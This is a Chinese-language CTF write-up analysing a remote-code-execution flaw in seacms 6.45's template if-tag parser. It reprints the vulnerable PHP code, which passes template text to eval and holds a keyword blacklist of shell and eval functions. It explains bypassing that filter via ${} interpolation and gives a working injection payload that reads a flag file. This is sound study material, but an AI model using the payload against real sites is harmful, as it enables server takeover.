## seacms6.45前台getshell漏洞分析

------

### 前言

​	安恒9月月赛的题目，赛后才知道是seacms的洞，记录一下分析过程。

### 分析过程

关键文件	ContentController.php

```php
class ContentController extends \yii\web\Controller
{
    public $enableCsrfValidation = false;
    public function beforeAction($action)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(['/site/login']);
        }
        return parent::beforeAction($action); // TODO: Change the autogenerated stub
    }

    public function actionIndex(){}       //图片保存
    public function cn_substr_utf8($str, $length, $start=0){}
    public function cn_substr($str,$slen,$startdd=0){}
    public function getSubStrByFromAndEnd($str,$startStr,$endStr,$operType){}
    public function buildregx($regstr,$regopt)
    {
        return '/'.str_replace('/','\/',$regstr).'/'.$regopt;
    }
    public function parseStrIf($strIf){}
    public function parseSubIf($content){}
    public function parseIf($content){
        if (strpos($content,'{if:')=== false){
            return $content;
        }else{
            $labelRule = $this->buildregx("{if:(.*?)}(.*?){end if}","is");
            //    /{if:(.*?)}(.*?){end if}/is
            $labelRule2="{elseif";
            $labelRule3="{else}";
            preg_match_all($labelRule,$content,$iar);
            foreach($iar as $v){
                $iarok[] = str_ireplace(array('unlink','opendir','mysqli_','mysql_','socket_','curl_','base64_','putenv','popen(','phpinfo','pfsockopen','proc_','preg_','_GET','_POST','_COOKIE','_REQUEST','_SESSION','_SERVER','assert','eval(','file_','passthru(','exec(','system(','shell_'), '@.@', $v);
            }
            $iar = $iarok;
            $arlen=count($iar[0]);
            $elseIfFlag=false;
            for($m=0;$m<$arlen;$m++){
                $strIf=$iar[1][$m];
                $strIf=$this->parseStrIf($strIf);
                $strThen=$iar[2][$m];
                $strThen=$this->parseSubIf($strThen);
                if (strpos($strThen,$labelRule2)===false){
                    if (strpos($strThen,$labelRule3)>=0){
                        $elsearray=explode($labelRule3,$strThen);
                        $strThen1=$elsearray[0];
                        // $strElse1=$elsearray[1];
                        @eval("if(".$strIf."){\$ifFlag=true;}else{\$ifFlag=false;}");
                        if ($ifFlag){ $content=str_replace($iar[0][$m],$strThen1,$content);} else {$content=str_replace($iar[0][$m],$strElse1,$content);}
                    }else{
                        @eval("if(".$strIf.") { \$ifFlag=true;} else{ \$ifFlag=false;}");
                        if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],"",$content);}
                }else{
                    $elseIfArray=explode($labelRule2,$strThen);
                    $elseIfArrayLen=count($elseIfArray);
                    $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);
                    $resultStr=$elseIfSubArray[1];
                    $elseIfArraystr0=addslashes($elseIfArray[0]);
                    @eval("if($strIf){\$resultStr=\"$elseIfArraystr0\";}");
                    for($elseIfLen=1;$elseIfLen<$elseIfArrayLen;$elseIfLen++){
                        $strElseIf=$this->getSubStrByFromAndEnd($elseIfArray[$elseIfLen],":","}","");
                        $strElseIf=$this->parseStrIf($strElseIf);
                        $strElseIfThen=addslashes($this->getSubStrByFromAndEnd($elseIfArray[$elseIfLen],"}","","start"));
                        @eval("if(".$strElseIf."){\$resultStr=\"$strElseIfThen\";}");
                        @eval("if(".$strElseIf."){\$elseIfFlag=true;}else{\$elseIfFlag=false;}");
                        if ($elseIfFlag) {break;}
                    }
                    $strElseIf0=$this->getSubStrByFromAndEnd($elseIfSubArray[0],":","}","");
                    $strElseIfThen0=addslashes($this->getSubStrByFromAndEnd($elseIfSubArray[0],"}","","start"));
                    if(strpos($strElseIf0,'==')===false&&strpos($strElseIf0,'=')>0)$strElseIf0=str_replace('=', '==', $strElseIf0);
                    @eval("if(".$strElseIf0."){\$resultStr=\"$strElseIfThen0\";\$elseIfFlag=true;}");
                    $content=str_replace($iar[0][$m],$resultStr,$content);
                }
            }
            return $content;
        }
    }

    public function actionShow(){       //显示图片
        $template = '<h1>图片内容为：</h1>图片ID：{cms:id}<br>图片名称:{cms:name}<br>图片地址：{cms:pic}';
        if (isset($_GET['id'])) {
            $model = new Content();
            $res = $model->find()->where(['id' =>intval($_GET['id'])])->one();//从数据库中获取文件
            $template = str_replace("{cms:id}",$res->id,$template);
            $template = str_replace("{cms:name}",$res->name,$template);
            $template = str_replace("{cms:pic}",$res->url,$template);
            $template = $this->parseIf($template);      //命令注入
            echo $template;
        }else{
            return json_encode(['error'=>'id error!']);
        }
    }
}
```

​	一堆eval（实际上就是在 if 的 () 条件里或者在 if 的 {} 代码里），我这里弄的是 

@eval("if($strIf){\$resultStr=\"$elseIfArraystr0\";}"); 这个

​	其实过程也比较简单，可以注意到这里用的是双引号，而双引号里面的变量我们可以控制并且在双引号中可以通过 

$ {phpinfo() }

​	这样来执行代码，所以接下来在把 addslashes 给绕一下就差不多了。最后payload：{if:1=1}${${print(`cat /tmp/flag`)}}{elseif:1=1}{else}{end if}

​	在构造payload的时候，因为有一个正则在限制，可以把正则给输出出来。然后在 https://regex101.com/ 这慢慢构造。